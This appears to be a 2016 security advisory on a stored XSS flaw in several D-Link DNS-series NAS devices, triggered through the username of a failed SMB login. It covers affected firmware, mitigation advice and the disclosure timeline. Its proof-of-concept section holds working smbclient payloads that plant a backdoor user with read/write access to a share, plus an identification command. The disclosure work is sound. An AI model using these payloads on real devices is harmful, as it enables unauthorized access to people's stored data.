---
layout: post
published: true
title: "D-Link NAS, DNS Series: Stored XSS via Unauthenticated SMB"
tags: [cve, xss, dlink]
category: Vulnerabilities
excerpt: "A vulnerability in seven D-Link NAS devices belonging to the DNS series may allow an attacker to gain full read and write access to the data stored on the device."
image:
  feature: ../images/banner-2016dlink.png
---

## Table of Contents

1. [Affected Models/Versions](#models)
2. [Summary](#summary)
3. [Recommendations for End-Users](#enduser)
4. [Technical Summary](#techsummary)
5. [Vulnerability Details](#details)
6. [Exploitation / Proof of Concept](#poc)
7. [Timeline](#timeline)
8. [See Also](#seealso)



## 1. Affected Models/Versions<a id="models"></a>

The vulnerability was initially discovered on a **D-Link DNS-320 rev A** device running **firmware version 2.05b8** (also known as: "2.13.0507.2014"). The remainder of this advisory describes and demonstrates the vulnerability based on this exact model and version.

However, according to D-Link **the following models are also vulnerable**. The version numbers and dates listed below indicate the firmware version current at the time D-Link confirmed these devices to be vulnerable. 

| Device / Model   | FW Version  | FW Date    |
| ---------------- | :---------: | ---------: |
| DNS-320 rev A	   | 2.05b8      | 28/07/2014 |
| DNS-320 rev B	   | 1.02        | 02/07/2014 |
| DNS-320L         | 1.06b03     | 28/07/2015 |
| DNS-325          | 1.05b3      | 02/07/2014 |
| DNS-327L         | 1.06b02     | 02/09/2014 |
| DNS-340L         | 1.04b01     | 11/02/2016 |
| DNS-345          | 1.04b2      | 17/12/2014 |


Both earlier and later versions may be affected as well.


## 2. Summary<a id="summary"></a>

The D-Link DNS-320 is a Network Storage Enclosure (<http://sharecenter.dlink.com/products/DNS-320> / <http://www.dlink.com/uk/en/support/product/dns-320-2-bay-sharecenter-network-storage-enclosure>). 

The device allows users to access stored data via SMB and it can be configured through a web interface.

This web interface is vulnerable to Stored Cross-Site Scripting, with the injection point being the username of an **unsuccessful** SMB login attempt.

The vulnerability can be used to read and write settings accessible through the web interface. Ultimately, an attacker may gain full read and write access to the data stored on the device.



## 3. Recommendations for End-Users<a id="enduser"></a>

Vulnerable devices should not be accessible from untrusted and potentially hostile networks such as the internet. If they are, they should be disconnected immediately. 

When a vulnerable device is not connected to the internet but to a local network, the greatest risk may come from malware, more specifically ransomware. 

Ransomware is becoming increasingly capable, and the effects of this development are not restricted to infection and evasion. Future ransomware may adapt to its environment in order to maximize its impact and, subsequently, the likelihood of a victim paying the ransom.

NAS devices are often used to store backups of data the user considers important enough to keep a copy of. The vulnerability described in this advisory enables ransomware to have data deleted from a NAS device the next time the victim logs into the administrative web interface.


### Identifying the currently installed firmware version

The currently installed firmware version can be identified through the administrative web interface. 

Depending on D-Link's future versioning system, it may become necessary to differentiate between vulnerable and not vulnerable firmware versions based on the firmware date.

For example, if the model is a **DNS-320 rev A** and the web interface displays the firmware version as "**2.05**", the vulnerable version can be identified by the displayed firmware date of "**05/07/2014**" (or earlier):

```
Current NAS Firmware Version 	2.05
Firmware Date 	05/07/2014
```

If the vulnerability were to be closed with firmware version **2.05b99** later this year, the web interface may display the firmware version as follows:

```
Current NAS Firmware Version 	2.05
Firmware Date 	 12/12/2016
```

For a list of devices and versions known to be vulnerable, see "[Affected Models/Versions](#models)" above.


### Suggested precautions when applying a firmware update

If D-Link addresses the vulnerability with a firmware update, its installation will require users to log into the vulnerable web interface. However, if an attacker has already managed to store malicious code inside the web interface, logging in to install the update may cause this code to be executed. 

While the vulnerability is, at the time of writing, not known to be exploited in the wild, precautions should be taken to apply the update in a safe and secure manner.

* Disconnect both the device and the computer used to administer the device from all other networks

To reduce risks to the data on connected hard drives, prior to logging into the web interface:

* Turn the device off.
* Disconnect all hard drives except one, which should not hold important data.
* Turn the device back on. 

To reduce risks posed by a previous exploitation attempt, either:

* Check all configuration options for suspicious or unwanted settings, particularly those related to "Account Management", or
* Revert the configuration options to their default/factory settings (System Management -> System Settings -> Defaults -> Restore)

Afterwards, download and apply the firmware update as described in the product manual.




## 4. Technical Summary<a id="techsummary"></a>

The device's administrative web interface contains a **Stored Cross-Site Scripting vulnerability, exploitable through an unauthenticated SMB login attempt (445/tcp)**. The injected code is executed when the victim logs into the administrative web interface.  

Unlike reflected XSS vulnerabilities, it does not require the victim to open an attacker-supplied link or to visit a malicious web page.  

This is one of the relatively few XSS vulnerabilities where malicious code can be injected despite having neither direct nor indirect access to the vulnerable web application. As such, it can be exploited even when access to ports 80/tcp (HTTP) and 443/tcp (HTTPS) is denied.

### CVE-ID

MITRE did not assign a CVE-ID; see [http://seclists.org/oss-sec/2016/q1/512](http://seclists.org/oss-sec/2016/q1/512) for some background.

If anybody ever gets a CVE-ID for this vulnerability, please [contact me](http://b.fl7.de/contact/) and I will update this advisory. 

## 5. Vulnerability Details<a id="details"></a>

The device keeps a record of unsuccessful SMB login attempts in a log file. For login attempts with a non-existing username, this username will be stored and later displayed without being sanitized. The contents of the log file can be viewed from within the device's web interface; either on a dedicated page (Management -> System Management -> Logs; ```<http://<IP>/web/management.html?id=log>```) or on the home page ```<http://<IP>/web/home.html>```. Both pages suffer from the same vulnerability, but because the home page is automatically loaded after a successful login, injected code will be run immediately afterwards and without further user interaction.

Because malicious code can be injected using a protocol (SMB) other than the protocol leading to its eventual execution (HTTP), preventing outside access to the web interface is not sufficient to protect against the exploitation of this vulnerability. 


## 6. Exploitation / Proof of Concept<a id="poc"></a>

Due to the nature of the vulnerability, it would be trivial to automate the injection of malicious code into a number of vulnerable devices. 

The following two ```smbclient``` commands serve as a proof of concept. Their purpose is to inject code that will create a new user with a password chosen by the attacker. In addition, it supplies this user with read/write permissions on the device's default share ("Volume_1"); which, by default, results in full read and write access to the data stored on the primary HDD. 

```
smbclient -U '<img src=&#47;cgi-bin&#47;account_mgr.cgi?cmd=cgi_adduser_to_session&s_name=Volume_1&ftp=true&read_list=&write_list=baduser&decline_list=&username=baduser&>' -N  '\\x\Volume_1' -I <TARGET IP>

smbclient -U '<img src=&#47;cgi-bin&#47;account_mgr.cgi?cmd=cgi_user_add&name=baduser&pw=badpass&>' -N  '\\x\Volume_1' -I <TARGET IP>
```

Once an administrator logs into the device's web interface, the code will be executed: a new user with an attacker-specified password will be created and granted read/write permissions to the "Volume_1" share. 

To confirm whether a device is one of the vulnerable models, ```rpcclient``` can be used. After issuing the ```querydominfo``` command, the model name can be found next to ```Comment```:

```
[~] $ rpcclient -U "" -N <TARGET IP>
rpcclient $> querydominfo
Domain:		WORKGROUP
Server:		DLINK-EXXXXX
Comment:	DNS-320 <===== Model
Total Users:	3
[...]
```


### Alternative, less intrusive PoC

Some readers may want to verify whether the vulnerability exists on their device, but without making configuration changes, such as the ones caused by the previously mentioned commands. 

In these cases, the following command may be used:

```
smbclient -U 'a<img src=x onerror=eval("alert(String.fromCharCode(88,83,83,64)+document.domain)")>b' -N  '\\x\Volume' -I <TARGET IP>
```

If the device is indeed vulnerable, the user will be greeted with an "XSS" popup window the next time s/he logs into the device's web interface:

<figure>
	<a href="/images/2016-dlink.png"><img src="/images/2016-dlink.png"></a>
</figure>






## 7. Timeline<a id="timeline"></a>

2016-01-11: Attempted to report vulnerability to D-Link via [web form](http://support.dlink.com/ReportVulnerabilities.aspx).  
2016-01-21: (Ten days later: still no response.)  
2016-01-21: Contacted <security@dlink.com> (following [Security Event Response Policy](ftp://ftp2.dlink.com/SECURITY%20ADVISEMENTS/SVPolicy-021114-2.PDF)).  
2016-01-21: D-Link responds within a few minutes.  
**2016-01-22: Vulnerability report sent.**  
2016-01-26: D-Link confirms vulnerability.  
2016-02-11: CVE-ID requested from MITRE via <cve-assign@mitre.org>.  
2016-02-12: MITRE rejects request.  
**2016-02-27: D-Link provides preview of updated firmware to verify fix.**  
**2016-03-01: Firmware reviewed, confirmation sent to D-Link.**  
2016-06-08: Asked D-Link for status update.  
2016-07-08: (One month later: still no response.)  
2016-07-08: Asked D-Link for status update.  
2016-07-13: D-Link states some firmware updates have been posted in "forums", remaining updates to be released "by the end of this week. 7/15".  
2016-07-19: Asked D-Link for direct links to said updates.  
2016-08-02: (Two weeks later: still no response.)  
**2016-08-02: Advisory published.**  


## 8. See Also<a id="seealso"></a> 

D-Link UK product pages of the affected devices:

* [DNS-320 rev A](http://www.dlink.com/uk/en/support/product/dns-320-2-bay-sharecenter-network-storage-enclosure?revision=deu_reva#downloads)  
* [DNS-320 rev B](http://www.dlink.com/uk/en/support/product/dns-320-2-bay-sharecenter-network-storage-enclosure?revision=deu_revb#downloads)  
* [DNS-320L](http://www.dlink.com/uk/en/home-solutions/share/network-attached-storage/dns-320l-sharecenter-2-bay-cloud-storage-enclosure)  
* [DNS-325](http://www.dlink.com/uk/en/support/product/dns-325-sharecenter-2-bay-network-storage-enclosure)  
* [DNS-327L](http://www.dlink.com/uk/en/home-solutions/share/network-attached-storage/dns-327l-2-bay-network-attached-storage)  
* [DNS-340L](http://www.dlink.com/uk/en/home-solutions/share/network-attached-storage/dns-340l-sharecenter-4-bay-cloud-network-storage-enclosure)  
* [DNS-345](http://www.dlink.com/uk/en/support/product/dns-345-sharecenter-4-bay-cloud-storage-4000)  

Product pages for other regions may contain different firmware versions.

